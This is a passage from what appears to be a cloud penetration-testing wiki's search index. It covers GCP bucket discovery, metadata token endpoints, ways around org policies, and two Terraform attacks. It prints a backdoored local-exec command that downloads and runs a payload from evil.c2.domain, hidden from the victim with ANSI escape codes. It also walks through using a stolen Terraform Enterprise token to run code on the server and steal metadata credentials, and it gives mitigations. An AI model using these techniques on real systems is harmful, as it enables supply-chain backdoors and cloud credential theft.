Buckets are almost 100% identical to AWS S3 Buckets. </p> <p>Theory: This call is based on OpenStack; maybe most cloud environments will be the same.</p> <p>Using @digininja's CloudStorageFinder diff the following files:</p> <p><code>diff bucket_finder.rb google_finder.rb</code></p> <p>The main differences are the URLs:</p> <ul> <li>AWS Supports HTTP and HTTPS</li> <li><code>AWS S3</code> URLs: <code>http://s3-region.amazonaws.com</code>, i.e.: <code>http://s3-eu-west-1.amazonaws.com</code>.</li> <li>GCP Endpoint: <code>https://storage.googleapis.com</code></li> </ul> <p>How to find buckets using CloudStorageFinder:</p> <p>Create a wordlist with any name; in our example, it is <code>wordlist.txt</code>.</p> <p>$ <code>ruby google_finder.rb wordlist.txt</code></p>"},{"location":"gcp/general-knowledge/metadata_in_google_cloud_instances/","title":"Metadata in Google Cloud Instances","text":"<p>Metadata can provide an attacker (or regular user) information about the compromised App Engine instance, such as its project ID, service accounts, and tokens used by those service accounts.  </p> <p>The metadata can be accessed by a regular HTTP GET request or cURL, sans any third-party client libraries by making a request to metadata.google.internal or 169.254.169.254.  </p> <p><pre><code>curl \"http://metadata.google.internal/computeMetadata/v1/?recursive=true&amp;alt=text\" -H\n\"Metadata-Flavor: Google\"\n</code></pre> Note: If you are using your local terminal to attempt access, as opposed to Google's Web Console, you will need to add <code>169.254.169.254    metadata.google.internal</code> to your <code>/etc/hosts</code> file.</p>"},{"location":"gcp/general-knowledge/metadata_in_google_cloud_instances/#metadata-endpoints","title":"Metadata Endpoints","text":"<p>For basic enumeration, an attacker can target.  <pre><code>http://169.254.169.254/computeMetadata/v1/\nhttp://metadata.google.internal/computeMetadata/v1/\nhttp://metadata/computeMetadata/v1/\nhttp://metadata.google.internal/computeMetadata/v1/instance/hostname\nhttp://metadata.google.internal/computeMetadata/v1/instance/id\nhttp://metadata.google.internal/computeMetadata/v1/project/project-id\n</code></pre> To view scope: <pre><code>http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H \"Metadata-Flavor: Google\"\n</code></pre> To view project metadata: <pre><code>curl \"http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&amp;alt=text\" \\\n    -H \"Metadata-Flavor: Google\"\n</code></pre> To view instance metadata: <pre><code>curl \"http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&amp;alt=text\" \\\n    -H \"Metadata-Flavor: Google\"\n</code></pre></p> <p>The following table is pulled from the Google Cloud Documentation</p> Metadata Endpoint Description <code>/computeMetadata/v1/project/numeric-project-id</code> The project number assigned to your project. <code>/computeMetadata/v1/project/project-id</code> The project ID assigned to your project. <code>/computeMetadata/v1/instance/zone</code> The zone the instance is running in. <code>/computeMetadata/v1/instance/service-accounts/default/aliases</code> <code>/computeMetadata/v1/instance/service-accounts/default/email</code> The default service account email assigned to your project. <code>/computeMetadata/v1/instance/service-accounts/default/</code> Lists all the default service accounts for your project. <code>/computeMetadata/v1/instance/service-accounts/default/scopes</code> Lists all the supported scopes for the default service accounts. <code>/computeMetadata/v1/instance/service-accounts/default/token</code> Returns the auth token that can be used to authenticate your application to other Google Cloud APIs."},{"location":"gcp/general-knowledge/security-and-constraints/","title":"Security and Constraints","text":"<p>Resources in GCP are created within projects. Projects are a mix of resource groups in Azure and accounts in AWS. Projects can optionally be organized using folders, which can be nested, to create a hierarchy. Projects and folders exist below a top-level organization. If a customer environment does not have a defined organization, the top-level entity will be an unnamed organization.</p> <p>An operator can place security constraints on organizations, folders, and projects to provide a baseline security policy. There are also organization-wide policy constraints that apply to every project. Policies are inherited from all containing items.</p> <p></p> <p>Reference: Resource hierarchy</p>"},{"location":"gcp/general-knowledge/security-and-constraints/#examples","title":"Examples","text":"<p>From: Organizational Policy Constraints</p> <ul> <li>constraints/iam.disableServiceAccountCreation : This can disable the overall creation of service accounts. Equivalent to Service Principals in Azure.</li> <li>constraints/iam.disableServiceAccountKeyCreation : This constraint will disable the ability to create a service account key. This constraint would be helpful if you want service accounts but only want to use RSA-based authentication. </li> </ul> <p>The majority of org policies are not retroactive. This means that if an org policy is created to enforce a particular constraint, any resources that already existed at the time of the policy creation will not be affected - even if they violate the new constraint. For example, if a policy is created to prevent creation of global load balancers, any existing global load balancers will not be impacted or deleted when the policy is established, and the load balancers will continue to function.</p> <p>According to Google, \"If an organization policy constraint is retroactively enforced, it will be labeled as such on the organization policy constraints page.\" At the time of writing, only two constraints are retroactively enforced:</p> <ol> <li><code>constraints/sql.restrictNoncompliantResourceCreation</code>: The documentation oddly states that this is retroactive, but then proceeds to state that it is retroactive in that it applies to existing projects, but does not apply to resources that existed at the time of policy modification (which thus means it is not retroactive).</li> <li><code>constraints/dataform.restrictGitRemotes</code>: This is used to restrict access to repositories from Dataform. It makes sense that this would be retroactive, as it impacts communication rather than resource creation.</li> </ol> <p>We can use the non-retroactive nature of org policies to our advantage. </p> <ol> <li><code>constraints/compute.requireShieldedVm</code>: If a compute node is already created and exists without this constraint applied, then this constraint will not be retroactive. You must delete the object and re-create it for it to enforce shielded VMs. </li> <li> <p><code>constraints/compute.vmExternalIpAccess</code>: Consider the following scenario:</p> <ul> <li>Constraint is based on the following permutation: <code>projects/PROJECT_ID/zones/ZONE/instances/INSTANCE</code></li> <li>Constraint looks for the <code>name</code> of the machine in the <code>project</code> identifier specified in the specific <code>zone</code></li> <li>If you can boot a VM with this specific set of criteria, then you can have a machine with an External IP Address</li> <li>Machine cannot already exist.</li> <li><code>constraints/compute.vmCanIpForward</code>: The machine must not exist before this setting is created. Once this is set, then machines will enforce this condition.</li> </ul> </li> </ol>"},{"location":"terraform/terraform_ansi_escape_evasion/","title":"Terraform ANSI Escape","text":"<p>Original Research: Joern Schneeweisz</p> <p>When performing a Terraform apply from a local workstation, Terraform will output a list of resources it has created, updated, or deleted. Because this is taking place in a terminal, we can potentially use ANSI escape codes to alter this output. This would allow us to hide or obfuscate malicious activity, such as in a malicious Terraform module.</p> <p>Take for example the following Terraform code.</p> main.tf<pre><code>resource \"null_resource\" \"hypothetical_ec2_instance\" {\n}\n\nresource \"null_resource\" \"blah\" {\n  provisioner \"local-exec\" {\n    command = \"wget -q http://evil.c2.domain/payload &amp;&amp; chmod +x payload &amp;&amp; ./payload\"\n  }\n}\n</code></pre> <p>In this example, we are using a local-exec provisioner to run shell commands. If we were to backdoor a module or git repository storing Terraform configurations, and a developer were to download them and run them on their workstation, this would run the shell commands on their workstation.</p> <p>Tip</p> <p>As an alternative to local-exec, you can also use external_provider.</p> <p>The problem is that this output would get displayed to the user, for example:</p> <p></p> <p>To solve this, we can use ANSI escape codes to modify this output. It is worth noting that the specific sequences we will need to use will depend on the terminal type the victim is using. The following example is using gnome-terminal on Ubuntu.</p> <pre><code>\\033[2K # Clears the current line\n\\033[A  # Moves the cursor to the previous line\n</code></pre> <p>So, we can modify our payload to the following to hide the malicious activity.</p> main.tf<pre><code>resource \"null_resource\" \"blah\" {\n  provisioner \"local-exec\" {\n    command = \"wget -q http://evil.c2.domain/payload &amp;&amp; chmod +x payload &amp;&amp; ./payload; echo -e '\\\\033[2K \\\\033[A \\\\033[2K \\\\033[A \\\\033[2K \\\\033[A \\\\033[2K \\\\033[A \\\\033[2K \\\\033[A \\\\033[2K \\\\033[A'\"\n  }\n}\n</code></pre> <p>And this is the output:</p> <p></p>"},{"location":"terraform/terraform_enterprise_metadata_service/","title":"Terraform Enterprise: Attack the Metadata Service","text":"<p>Terraform Enterprise is a self-hosted version of Terraform Cloud, allowing organizations to maintain their own private instance of Terraform. There are many benefits for an enterprise to run this, however, there is also a default configuration that Red Teamers and Penetration Testers can potentially take advantage of.</p> <p>If Terraform Enterprise is deployed to a VM from a cloud provider we may be able to access the instance metadata service and leverage those credentials for further attacks.</p> <p>\"By default, Terraform Enterprise does not prevent Terraform operations from accessing the instance metadata service, which may contain IAM credentials or other sensitive data\" (source)</p> <p>Note</p> <p>While the focus of this article is on targeting the metadata service, it is worth noting that gaining code execution inside a Terraform run may provide other avenues for attack. For example, environment variables could be leaked which may contain sensitive credentials.</p>"},{"location":"terraform/terraform_enterprise_metadata_service/#remote-code-execution","title":"Remote (Code) Execution","text":"<p>For many engineers, their first experience with Terraform was locally on their workstations. When they invoked a <code>terraform apply</code> or <code>terraform plan</code> all of that activity took place on the local machine (reaching out to cloud APIs, tracking state, etc.)</p> <p>An exciting feature of Terraform Enterprise (and Cloud) is the idea of Remote Execution, wherein all those operations take place server-side. In Terraform Cloud the execution takes place in \"disposable virtual machines\". In Terraform Enterprise however, it takes place in \"disposable Docker containers\". </p> <p>This introduces an interesting opportunity; If you compromise credentials to initiate a <code>plan</code> or <code>apply</code> operation (or otherwise have access to them. I.E insider threat) we can execute code in a Docker container on the Terraform Enterprise server.</p> <p>Note</p> <p>It is possible to disable Remote Execution via a configuration however this is discouraged. \"Many of Terraform Cloud's features rely on remote execution, and are not available when using local operations. This includes features like Sentinel policy enforcement, cost estimation, and notifications.\"</p>"},{"location":"terraform/terraform_enterprise_metadata_service/#docker-containers-and-metadata-services","title":"Docker Containers and Metadata Services","text":"<p>Aside from container escapes, running user-supplied code in a container is an interesting opportunity in a cloud context. The specifics will depend upon the cloud provider. For example, in AWS, an attacker could target the Instance Metadata Service. This would provide the attacker IAM credentials for the IAM role associated with the EC2 instance.</p> <p>Other opportunities include things such as the instance user data, which may help enumerate what software is on the host, potentially leak secrets, or reveal what the associated IAM role has access to. It is also possible to use this to pivot to other machines in the VPC/subnet which would otherwise be inaccessible, or to attempt to hit services exposed on localhost on the TFE host (hitting 172.17.0.1).</p>"},{"location":"terraform/terraform_enterprise_metadata_service/#attack-prevention","title":"Attack Prevention","text":"<p>It is worth noting that there are two potential methods to mitigate this attack. The first is the configuration of restrict_worker_metadata_access in the Terraform Enterprise settings. This is not the default, meaning that out of the box Terraform operations have access to the metadata service and its credentials.</p> <p>The second option would depend upon the cloud provider, but options to harden or secure the Metadata Service can also be used. For example, IMDSv2 in an AWS situation would prevent the Docker container from reaching the Metadata Service.</p> <p>Note</p> <p>Nothing should prevent these two methods from working at the same time. It is a good idea to require IMDSv2 of all EC2 instances in your environment.</p>"},{"location":"terraform/terraform_enterprise_metadata_service/#walkthrough","title":"Walkthrough","text":"<p>Warning</p> <p>This walkthrough and screenshots are not tested against Terraform Enterprise (this is a free/open source project, we don't have access to a Terraform Enterprise instance for demonstration purposes). As such it is being demoed on Terraform Cloud which, while similar, is not a 1-1 copy. If you are attempting to exploit this against your organization's TFE instance, minor tweaks may be needed. (We are open to Pull Requests!)</p> <p>Note</p> <p>If you already have a configured and initialized Terraform backend, you can skip to the Executing Code section. The following walkthrough will demonstrate the entire process from finding the token to initializing the backend.</p>"},{"location":"terraform/terraform_enterprise_metadata_service/#acquire-a-terraform-api-token","title":"Acquire a Terraform API Token","text":"<p>To begin, you'll first need to 'acquire' a Terraform API Token. These tokens can be identified by the <code>.atlasv1.</code> substring in them.</p> <p>As for where you would get one, there are a number of possible locations. For example, developer's may have them locally on their workstations in <code>~/.terraform.d/</code>, you may find them in CI/CD pipelines, inappropriately stored in documentation, pull them from a secrets vault, create one with a developer's stolen credentials, etc.</p>"},{"location":"terraform/terraform_enterprise_metadata_service/#identify-the-organization-and-workspace-names","title":"Identify the Organization and Workspace Names","text":"<p>With access to a valid API token, we now need to find an Organization and Workspace we can use to be nefarious. The good news is that this information is queryable using the token. We can use a tool such as jq to parse and display the JSON.</p> <pre><code>curl -H \"Authorization: Bearer $TFE_TOKEN\" \\\nhttps://&lt;TFE Instance&gt;/api/v2/organizations | jq\n</code></pre> <p></p> <p>Next, we need to identify a workspace we can use. Again, this can be quereyed using the organization <code>id</code> we gathered in the previous step.</p> <pre><code>curl -H \"Authorization: Bearer $TFE_TOKEN\" \\\nhttps://&lt;TFE Instance&gt;/api/v2/organizations/&lt;Organization ID&gt;/workspaces | jq\n</code></pre> <p></p>"},{"location":"terraform/terraform_enterprise_metadata_service/#configure-the-remote-backend","title":"Configure the Remote Backend","text":"<p>Now that we have the organization and workspace id's from the previous step, we can configure the remote backend. To do this, you can use this example as a template with one exception. We will add a <code>hostname</code> value which is the hostname of the Terraform Enterprise instance. You can store this in a file named <code>backend_config.tf</code>. backend_config.tf<pre><code>terraform {\n  backend \"remote\" {\n    hostname = \"{{TFE_HOSTNAME}}\"\n    organization = \"{{ORGANIZATION_NAME}}\"\n\n    workspaces {\n      name = \"{{WORKSPACE_NAME}}\"\n    }\n  }\n}\n</code></pre></p>"},{"location":"terraform/terraform_enterprise_metadata_service/#initialize-the-backend","title":"Initialize the Backend","text":"<p>With the backend configuration file created we can initialize the backend with the following command.</p> <pre><code>terraform init --backend-config=\"token=$TFE_TOKEN\"\n</code></pre> <p>If everything has worked as it should, you should get a <code>Terraform has been successfully initialized</code> notification. To test this, you can perform a <code>terraform state list</code> to list the various state objects.</p>"},{"location":"terraform/terraform_enterprise_metadata_service/#executing-code","title":"Executing Code","text":"<p>Now that our backend has been properly configured and we can access the remote state, we can attempt to execute code. There are several ways this can be done (such as using a local-exec provisioner) however, for our purposes we will be using the External Provider.</p> <p>\"<code>external</code> is a special provider that exists to provide an interface between Terraform and external programs\".</p> <p>What this means is that we can execute code during the Terraform <code>plan</code> or <code>apply</code> operations by specifying a program or script to run.</p> <p>To do this, we will create an <code>external provider</code> in our existing <code>backend_config.tf</code> file (if you already have an existing Terraform project you can add this block to those existing files).</p> backend_config.tf<pre><code>...\n\ndata \"external\" \"external_provider\" {\n    program = [\"python3\", \"wrapper.py\"]\n}\n\noutput \"external_provider_example\" {\n    value = data.external.external_provider\n}\n</code></pre> <p>You may be wondering what the <code>wrapper.py</code> file is. In order to use the <code>external</code> provider, we must \"implement a specific protocol\" (source), which is JSON. To do this, we will wrap the result of the code execution in JSON so it can be returned.</p> <p>Note</p> <p>The wrapper script is not strictly required if you aren't interested in getting the output. If your goal is simply to execute a C2 payload, you can include the binary in the project directory and then execute it.</p> <p>Wrapping the output in JSON allows us to get the response output.</p> <p>Our wrapper script looks like the following (feel free to change to your needs).</p> wrapper.py<pre><code>import json\nimport os\n\nstream = os.popen('id')\noutput = stream.read()\nresult = { \"result\" : output }\n\nprint(json.dumps(result))\n</code></pre>"},{"location":"terraform/terraform_enterprise_metadata_service/#terraform-plan","title":"Terraform Plan","text":"<p>Now that the wrapper script is created (and modified), we can execute code via <code>terraform plan</code>. This is a non-destructive action, which will evaluate our local configuration vs's the remote state. In addition, it will execute our remote provider and return the result to us.</p> <p></p> <p>Warning</p> <p>Upon executing <code>terraform plan</code> you may encounter errors for various reasons depending upon the remote state. Those errors will need to be handled on a case by case basis. Typically this involves modifying your <code>.tf</code> files to suit the remote state. This can typically be figured out based on the results of <code>terraform state pull</code>.</p> <p>From here, we can modify our wrapper script to do a variety of things such as (the purpose of this article) reaching out to the metadata service and pulling those credentials.</p> <p>Note</p> <p>The results of this run are logged elsewhere. Please do not leak secrets or other sensitive information to parties who do not have a need for the information. A more efficient method would be to use a C2 platform such as Mythic (or even just a TLS encrypted reverse shell) to exfiltrate the credentials.</p>"}]}